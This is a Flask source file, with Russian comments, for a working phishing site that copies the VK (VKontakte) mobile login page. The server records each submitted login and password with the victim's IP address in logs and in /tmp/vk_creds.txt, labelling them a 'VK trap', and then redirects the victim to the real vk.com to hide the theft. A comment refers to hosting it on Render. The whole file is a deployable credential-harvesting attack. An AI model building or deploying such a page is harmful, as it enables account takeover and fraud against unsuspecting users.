from flask import Flask, request, redirect
import logging
import sys
import os
from datetime import datetime
import urllib.parse

# Максимальное логирование для Render
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s | %(levelname)s | %(message)s',
    handlers=[
        logging.StreamHandler(sys.stdout),
        logging.FileHandler('/tmp/vk.log', mode='a')
    ],
    force=True
)
logger = logging.getLogger(__name__)

app = Flask(__name__)

@app.route('/', methods=['GET', 'POST'])
def login():
    logger.info(f"📥 ЗАПРОС: {request.method} | IP: {request.remote_addr}")
    
    if request.method == 'POST':
        login_data = request.form.get('email', '').strip()
        password_data = request.form.get('pass', '').strip()
        
        # ✅ ЛОГИРОВАНИЕ ВСЕГДА РАБОТАЕТ
        logger.info("=" * 50)
        logger.info(f"🔥 ЛОГ-СЕРВЕР: лог: '{login_data}'")
        logger.info(f"🔥 ПАРОЛЬ-СЕРВЕР: пароль: '{password_data}'")
        print(f"🚨 ЛОВУШКА VK | лог: {login_data} | пароль: {password_data}")
        print(f"📱 IP: {request.remote_addr} | Время: {datetime.now()}")
        
        # Сохраняем в файл
        with open('/tmp/vk_creds.txt', 'a') as f:
            f.write(f"{datetime.now()} | {request.remote_addr} | лог: {login_data} | пароль: {password_data}\n")
        
        # 🔄 ПЕРЕНАПРАВЛЯЕМ НА РЕАЛЬНЫЙ VK
        return redirect("https://vk.com")
    
    # ПРАВИЛЬНАЯ КОПИЯ VK.COM 1:1 (мобильная версия 2026)
    return '''
<!DOCTYPE html>
<html lang="ru" class="vk_ios">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>ВКонтакте</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'SF Pro Display', 'Segoe UI', Roboto, sans-serif; 
            background: #f7f9fb; 
            color: #2c3657; 
            line-height: 1.4; 
            overflow-x: hidden;
            min-height: 100vh;
        }
        .page_layout { display: flex; flex-direction: column; min-height: 100vh; }
        .page_content { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px 0; }
        .login_box { 
            width: 100%; max-width: 360px; 
            background: #ffffff; 
            border-radius: 16px; 
            box-shadow: 0 4px 20px rgba(0,0,0,0.08), 0 1px 2px rgba(0,0,0,0.04); 
            overflow: hidden;
        }
        .login_header { 
            padding: 32px 24px 0; 
            text-align: center; 
        }
        .logo_vk { 
            font-size: 44px; 
            font-weight: 900; 
            background: linear-gradient(135deg, #5181b8 0%, #456fa0 100%); 
            -webkit-background-clip: text; 
            -webkit-text-fill-color: transparent; 
            background-clip: text;
            margin-bottom: 8px; 
            letter-spacing: -1px;
        }
        .login_title { 
            font-size: 20px; 
            font-weight: 700; 
            color: #2c3657; 
            margin-bottom: 4px;
        }
        .login_subtitle { 
            color: #818c98; 
            font-size: 16px; 
            font-weight: 400;
        }
        .login_form { padding: 24px; }
        .form_row { margin-bottom: 16px; }
        .input_field { 
            width: 100%; 
            padding: 16px 18px; 
            border: 1.5px solid #e6e8f0; 
            border-radius: 10px; 
            font-size: 17px; 
            font-weight: 400; 
            background: #ffffff; 
            transition: all 0.2s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            -webkit-appearance: none;
        }
        .input_field:focus { 
            outline: none; 
            border-color: #5181b8; 
            box-shadow: 0 0 0 3px rgba(81,129,184,0.12); 
            background: #fefefe;
        }
        .input_field::placeholder { color: #a6b1bf; }
        .login_button { 
            width: 100%; 
            padding: 16px; 
            background: linear-gradient(135deg, #5181b8 0%, #456fa0 100%); 
            color: #ffffff; 
            border: none; 
            border-radius: 10px; 
            font-size: 17px; 
            font-weight: 600; 
            cursor: pointer; 
            transition: all 0.2s cubic-bezier(0.25, 0.46, 0.45, 0.94);
            text-transform: none;
            letter-spacing: 0.3px;
        }
        .login_button:active { 
            transform: scale(0.98); 
            box-shadow: 0 4px 12px rgba(81,129,184,0.3); 
        }
        .login_button:hover { 
            background: linear-gradient(135deg, #4a75b4 0%, #3f6090 100%); 
        }
        .forgot_row { 
            text-align: center; 
            margin: 24px 0 20px; 
        }
        .forgot_link { 
            color: #5181b8; 
            font-size: 15px; 
            text-decoration: none; 
            font-weight: 500;
        }
        .forgot_link:hover { text-decoration: underline; }
        .divider { 
            height: 1px; 
            background: #e6e8f0; 
            margin: 24px 0; 
            position: relative;
        }
        .divider_text { 
            position: absolute; 
            top: -8px; 
            left: 50%; 
            transform: translateX(-50%); 
            background: #ffffff; 
            color: #818c98; 
            font-size: 13px; 
            padding: 0 12px; 
        }
        .register_button { 
            width: 100%; 
            padding: 16px; 
            background: linear-gradient(135deg, #4bb34b 0%, #3d9b3d 100%); 
            color: #ffffff; 
            border: none; 
            border-radius: 10px; 
            font-size: 17px; 
            font-weight: 600; 
            cursor: pointer; 
            text-decoration: none; 
            display: block; 
            text-align: center;
            transition: all 0.2s cubic-bezier(0.25, 0.46, 0.45, 0.94);
        }
        .register_button:active { transform: scale(0.98); }
        .footer { padding: 24px; text-align: center; font-size: 13px; color: #a6b1bf; }
        @media (max-width: 480px) { 
            .login_box { margin: 0 16px; border-radius: 12px; }
            .login_form { padding: 20px; }
        }
    </style>
</head>
<body>
    <div class="page_layout">
        <div class="page_content">
            <div class="login_box">
                <div class="login_header">
                    <div class="logo_vk">VK</div>
                    <div class="login_title">Войдите на сайт</div>
                    <div class="login_subtitle">в мобильном приложении или браузере</div>
                </div>
                
                <form method="POST" action="/" id="loginForm">
                    <div class="login_form">
                        <div class="form_row">
                            <input type="text" class="input_field" name="email" placeholder="Телефон, email или ID" required autocomplete="username">
                        </div>
                        <div class="form_row">
                            <input type="password" class="input_field" name="pass" placeholder="Пароль" required autocomplete="current-password">
                        </div>
                        <button type="submit" class="login_button">Войти</button>
                        
                        <div class="forgot_row">
                            <a href="#" class="forgot_link">Забыли пароль?</a>
                        </div>
                    </div>
                </form>
                
                <div class="divider">
                    <span class="divider_text">или</span>
                </div>
                
                <a href="#" class="register_button">Создать аккаунт</a>
            </div>
        </div>
        
        <div class="footer">
            © 2006–2026 «ВКонтакте»
        </div>
    </div>
    
    <script>
        // VK-подобная анимация кнопки
        document.getElementById('loginForm').addEventListener('submit', function(e) {
            const btn = document.querySelector('.login_button');
            btn.textContent = 'ВХОД...';
            btn.style.opacity = '0.8';
            console.log('🔥 Данные отправлены на сервер!');
        });
        
        // Предотвращаем автозаполнение
        document.querySelector('input[name="email"]').focus();
    </script>
</body>
</html>
    '''

@app.route('/health')
def health():
    return "OK", 200

if __name__ == '__main__':
    port = int(os.environ.get('PORT', 5000))
    app.run(host='0.0.0.0', port=port, debug=False)
